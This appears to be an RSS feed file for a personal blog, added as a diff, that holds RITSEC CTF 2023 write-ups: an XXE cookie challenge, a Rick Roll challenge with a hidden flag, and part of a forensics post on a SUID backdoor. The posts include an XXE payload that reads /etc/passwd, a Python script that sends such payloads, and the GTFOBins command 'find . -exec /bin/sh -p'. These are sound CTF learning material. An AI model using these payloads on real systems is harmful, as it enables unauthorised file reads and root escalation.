@@ -1,0 +1,1139 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Leo Reading</title>
+    <description>devlopr-jekyll is a beautiful Jekyll Theme Built For Developers, which is optimized for speed and readability.</description>
+    <link>/</link>
+    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Fri, 21 Nov 2025 17:21:04 +0000</pubDate>
+    <lastBuildDate>Fri, 21 Nov 2025 17:21:04 +0000</lastBuildDate>
+    <generator>Jekyll v4.3.2</generator>
+
+    
+      <item>
+        <title>RITSEC 2023 - Web / X-Men Lore</title>
+        <description>&lt;h1 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h1&gt;
+&lt;p&gt;There’s an x-men themed website that gives you buttons to view more info about a given “X-Man”.&lt;/p&gt;
+
+&lt;h2 id=&quot;cookies-on-click&quot;&gt;Cookies On Click&lt;/h2&gt;
+&lt;p&gt;After clicking around for a bit, I noticed that the URL for every x-man was the same: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/xmen&lt;/code&gt;.  This told me that we were either doing a post request or using a cookie of some kind.  After viewing the links on the main page, I noticed something a bit odd in the HTML:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/xmen&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4='&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      Beast
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This is a link, with a button that sets a cookie before it navigates.  This is pretty unusual, so let’s dig in a bit.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-cookie-value&quot;&gt;The Cookie Value&lt;/h2&gt;
+&lt;p&gt;First and foremost, this cookie value looks like base64 data.  Let’s decode it:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -n 'PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4=' | base64 -d
+&amp;lt;?xml version='1.0' encoding='UTF-8'?&amp;gt;&amp;lt;input&amp;gt;&amp;lt;xmen&amp;gt;Beast&amp;lt;/xmen&amp;gt;&amp;lt;/input&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;….it’s XML? Well this just keeps getting weirder.&lt;/p&gt;
+
+&lt;h2 id=&quot;xxe&quot;&gt;XXE&lt;/h2&gt;
+&lt;p&gt;Inspecting each of the cookie values that the buttons set, I can see that there’s always an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmen&lt;/code&gt; attribute.  This is screaming XXE.  Let’s try one!&lt;/p&gt;
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;xmen&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xmen&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/input&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And our base-64 encoded version:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIGZvbyBbIDwhRUxFTUVOVCBmb28gQU5ZID4KPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA+XT4KPGlucHV0PgogICAgPHhtZW4+Jnh4ZTs8L3htZW4+CjwvaW5wdXQ+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For now, I manually set the cookie in my browser using the dev tools, and refreshed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/orders&lt;/code&gt; page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/x-men-lore/set-cookie.png&quot; alt=&quot;setting cookie value in dev tools&quot; title=&quot;Setting the Cookie&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/x-men-lore/etc-passwd-leak.png&quot; alt=&quot;etc passwd leaked&quot; title=&quot;Leaking /etc/passwd&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;grabbing-the-flag&quot;&gt;Grabbing the Flag&lt;/h2&gt;
+&lt;p&gt;Great!  We have an LFI via XEE, and we can just go on our merry way and grab the flag.  It’s DEFINITELY going to be at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/flag.txt&lt;/code&gt;, right??? Wrong.  I spent about 20 minutes piecing together the exploit, and that was a ton of fun!  Simple, educational, easy enough to understand.  What took me two hours?  Finding the dang flag.  I finally found it at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flag&lt;/code&gt;, but… I really wish they standardized the location of where to find flags.  Someone in the CTF Discord said something that resonated with me.  I’m omitting their name and only quoting part of the message, so, realize there’s probably more context:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;the difficulty should be in exploiting the problem, not in going around trying to do random stuff to find the flag.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Because I was so frustrated trying to find the flag, I decided to see if I could find the server source code.  That was another guessing game, but I eventually found it at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/user/app.py&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lxml.etree&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ET&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/xmen&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;xmen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xmen&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xmen.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This was working exactly as you’d expect, there was no secret sauce here.  I even set up the server to run locally to see if I could figure out a payload to get a directory listing.  I did everything I could to avoid brute-forcing it, because that slows the webserver down, causes crashes, and ruins the fun for everyone else for a few fake internet points.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-next-day&quot;&gt;The Next Day&lt;/h2&gt;
+&lt;p&gt;After shutting down for the night feeling defeated, I checked back the next day and they released a hint, basically telling you the flag isn’t where you thought it was. …well that was obvious to me already, so not a lot of help.  A teammate gave me a quick python script to make my guesses a bit faster:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://xmen-lore-web.challenges.ctf.ritsec.club/xmen&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;
+&amp;lt;!ENTITY xxe SYSTEM &quot;file://{command}&quot; &amp;gt;]&amp;gt;
+&amp;lt;input&amp;gt;
+    &amp;lt;xmen&amp;gt;&amp;amp;xxe;&amp;lt;/xmen&amp;gt;
+&amp;lt;/input&amp;gt;&quot;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;encoded_cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xmen&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)})&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using this, I just guessed enough until I found it was living at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flag&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;This is the only challenge that I’ve given constructive or critical feedback for. With that said, it didn’t ruin the fun or my opinion or RITSEC CTF.  They put on such an awesome CTF this year, and I’m glad I was able to participate!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/web/x-men-lore</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/x-men-lore</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Web / Rick Roll</title>
+        <description>&lt;h1 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h1&gt;
+&lt;p&gt;You are led to a website called that is literally just a rickroll.  There’s a “don’t sign in” button that takes you to the infamous video.  Props to the author for the amount of trolling here.&lt;/p&gt;
+
+&lt;h2 id=&quot;finding-the-flag&quot;&gt;Finding the Flag&lt;/h2&gt;
+&lt;p&gt;Well, there isn’t any obvious way of interacting with this website aside from the 2 static HTML pages.  So let’s take a look at the source.  First, I’ll look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Don't.html&lt;/code&gt;.  Right away, I see a lot of comments at the bottom of the page.  It seems to be the lyrics, and boy oh boy I’m getting RickRolled at this point.  I decided to scroll through them on a hunch, and I see a comment in the middle of the lyrics that says “It might be here!”
+Scrolling down a bit more, I found this line:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/rick-roll/comment-1.png&quot; alt=&quot;Partial Flag in HTML Comment&quot; title=&quot;Partial Flag&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+That looks like a partial flag if I’ve ever seen one!  Let’s grab the entire source.&lt;/p&gt;
+
+&lt;h2 id=&quot;grabbing-the-source&quot;&gt;Grabbing the Source&lt;/h2&gt;
+&lt;p&gt;This site is small enough that you could just use curl or wget, but I found this nifty tool that does it for you. &lt;a href=&quot;https://websitedownloader.io&quot;&gt;https://websitedownloader.io&lt;/a&gt;.  I can’t verify they aren’t spying on you or distributing malware or anything, I’m just saying I used it once and it worked fine.&lt;/p&gt;
+
+&lt;p&gt;After we get the source, we just need to scan through the files to find the other pieces of the flag.  This turned out to be pretty easy, as they were all comments, and I was using an IDE with syntax highlighting.  The instructions for the challenge were actually in one of the CSS files, &lt;a href=&quot;https://rickroll-web.challenges.ctf.ritsec.club/2.css&quot;&gt;https://rickroll-web.challenges.ctf.ritsec.club/2.css&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/rick-roll/css-instructions.png&quot; alt=&quot;Instructions in CSS file&quot; title=&quot;Instructions&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;When I first started finding the parts of the flags, there was some strange encoding issues where it wasn’t rendering correctly in the dev tools.  I should have just downloaded the source to  begin with, and I would have avoided some guess and check work later.  This lesson may or may not repeat itself in another challenge…&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/web/rick-roll</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/rick-roll</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Forensics / Red Team Activity 4</title>
+        <description>&lt;h1 id=&quot;picking-up-where-we-left-off&quot;&gt;Picking Up Where We Left Off&lt;/h1&gt;
+&lt;p&gt;Please see &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-1&quot;&gt;Red Team Activity 1&lt;/a&gt;, &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-2&quot;&gt;Red Team Activity 2&lt;/a&gt;, and &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-1&quot;&gt;Red Team Activity 1&lt;/a&gt; for more context on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt;, and why we searched for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; commands.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h2&gt;
+&lt;p&gt;The red-teamers modified a binary to &lt;strong&gt;later&lt;/strong&gt; escalate privileges. Let’s find out what they did!&lt;/p&gt;
+
+&lt;h2 id=&quot;previous-recon&quot;&gt;Previous Recon&lt;/h2&gt;
+&lt;p&gt;In the previous 2 cases, our initial grep for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; done from a tty led us straight to the answer.  Unfortunately, that’s not the case here!  We’ve already explored all of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; entires, so it’s time to look for something different.  If you already have root on a system, which our attackers do, a common tactic for future exploitation is &lt;a href=&quot;https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/&quot;&gt;setting a SUID bit&lt;/a&gt;. To keep it brief, this allows regular users to execute a file as the owner of the file without the use of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt;.  When the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user owns the file, this is as good as running it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;keep-digging&quot;&gt;Keep Digging&lt;/h2&gt;
+&lt;p&gt;How would we set the SETUID bit?  Well, there’s different ways of doing it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;, so let’s just start there:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep 'chmod' tty.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-4/chmod-tty-log.png&quot; alt=&quot;grep 'chmod' ttyl.log&quot; title=&quot;grep 'chmod' tty.log&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Here, we see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s&lt;/code&gt; (setting the SUID) was used on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/find&lt;/code&gt;.  This isn’t something you would normally do.  Let’s dig a bit deeper.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep 'chmod u+s /usr/bin/find' -A 25 auth.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Here, we are asking for the 25 lines AFTER the match from grep.  Again, you could use an editor if you prefer by grabbing the line number using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; flag in grep.&lt;/p&gt;
+
+&lt;h2 id=&quot;why-this-file&quot;&gt;Why This File?&lt;/h2&gt;
+&lt;p&gt;If you’ve never heard of &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;, definitely check it out.  You can find a lot of pretty standard OS files that can help you escalate privs while you’re attacking.  If we look at GTFOBins and search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt;, we’ll see it’s listed as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell, SUID, Sudo&lt;/code&gt;.  This is why the attackers set the SUID bit on find, so that a regular user can use it to get access as root.  According to the &lt;a href=&quot;https://gtfobins.github.io/gtfobins/find/&quot;&gt;GTFOBins Page on Find&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;./find . -exec /bin/sh -p \; -quit&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will allow you to escalate privledges when the SUID bit is set on find.
+Interestingly, we see the attackers do this very command a few lines later.  First, they su from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; to their &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redteam&lt;/code&gt; user.  They then run a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; (presumably capturing screenshots as proof), then run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find . -exec /bin/sh -p ; -quit&lt;/code&gt;.  Does this look familiar?&lt;/p&gt;
+
